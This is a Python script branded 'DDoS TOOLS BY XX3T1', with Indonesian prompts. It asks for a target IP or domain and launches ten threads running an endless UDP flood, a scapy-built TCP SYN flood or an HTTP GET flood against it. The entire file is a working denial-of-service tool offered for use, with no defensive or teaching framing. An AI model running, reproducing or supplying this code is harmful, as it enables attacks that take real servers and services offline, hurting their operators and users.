import socket
import requests
import threading
import random
from scapy.all import *

# UDP Flood
def udp_flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)
    while True:
        sock.sendto(bytes_to_send, (ip, port))
        print(f"[UDP] Menyerang {ip}:{port}")

# TCP SYN Flood
def tcp_syn_flood(ip, port):
    while True:
        ip_layer = IP(dst=ip)
        tcp_layer = TCP(dport=port, flags="S")
        packet = ip_layer / tcp_layer
        send(packet, verbose=False)
        print(f"[TCP SYN] Menyerang {ip}:{port}")

# HTTP GET Flood
def http_flood(url):
    while True:
        try:
            response = requests.get(url)
            print(f"[HTTP] Menyerang {url} - Status: {response.status_code}")
        except:
            print("[HTTP] Target down atau server menolak koneksi")

def main():
    print("""
    ╔══════════════════════════╗
    ║      DDoS TOOLS          ║
    ║      BY XX3T1            ║
    ╚══════════════════════════╝
    """)

    target = input("Masukkan IP atau Domain target: ")

    # Cek apakah input berupa IP atau domain
    if target.replace('.', '').isdigit():
        print("1. UDP Flood")
        print("2. TCP SYN Flood")
        mode = int(input("Pilih mode serangan (1-2): "))
        port = int(input("Masukkan port target: "))

        if mode == 1:
            for _ in range(10):
                threading.Thread(target=udp_flood, args=(target, port)).start()
        elif mode == 2:
            for _ in range(10):
                threading.Thread(target=tcp_syn_flood, args=(target, port)).start()
        else:
            print("Pilihan tidak valid!")

    else:
        for _ in range(10):
            threading.Thread(target=http_flood, args=(target,)).start()

if __name__ == "__main__":
    main()
